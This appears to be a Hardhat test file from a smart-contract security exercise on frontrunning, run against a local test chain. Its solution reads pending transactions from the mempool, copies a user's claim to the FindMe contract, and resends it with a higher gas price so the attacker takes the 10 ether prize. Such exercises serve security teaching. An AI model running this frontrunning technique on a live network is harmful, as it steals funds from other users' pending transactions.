import { ethers } from 'hardhat';
import { expect } from 'chai';
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
import { FindMe } from '../typechain-types';

// NOTE: Destructuring Properties from an Object
const { provider, deployContract, getSigners, parseEther, parseUnits } = ethers;

describe('Frontrunning Attack Exercise 1', () => {
  let [deployer, user, attacker]: SignerWithAddress[] = [];
  let attackerInitialBalance: bigint;
  let findMe: FindMe;

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
    [deployer, user, attacker] = await getSigners();
    attackerInitialBalance = await provider.getBalance(attacker.address);

    findMe = await deployContract('FindMe', {
      value: parseEther('10'),
    }) as any as FindMe;
    await provider.send('evm_mine', []);

    const obfuscatedString = atob('RXRoZXJldW0=');
    await findMe.connect(user).claim(obfuscatedString);
  });

  it('Exploit', async () => {
    //** CODE SOLUTION HERE */

    // TODO: Get all the tx's in the mempool
    const pendingBlock = await provider.send('eth_getBlockByNumber', ['pending', true]);

    // TODO: Find the tx that is being sent from the user to the FindMe contract
    let transaction = pendingBlock.transactions.find((tx: any) => tx.to?.toLowerCase() == (findMe.target as string).toLowerCase());

    // TODO: Send the same tx with more gas
    await attacker.sendTransaction({
      to: transaction.to,
      data: transaction.input,
      gasPrice: transaction.gasPrice + 1,
      gasLimit: transaction.gas,
    });
  });

  after(async () => {
    // Mine all the transactions
    await provider.send('evm_mine', []);

    // Check if the attacker has in his balance at least 9.9 more ether than what he had before
    const attackerBalance = await provider.getBalance(attacker.address);
    expect(attackerBalance).is.gt(attackerInitialBalance + parseEther('9.9'));
  });
});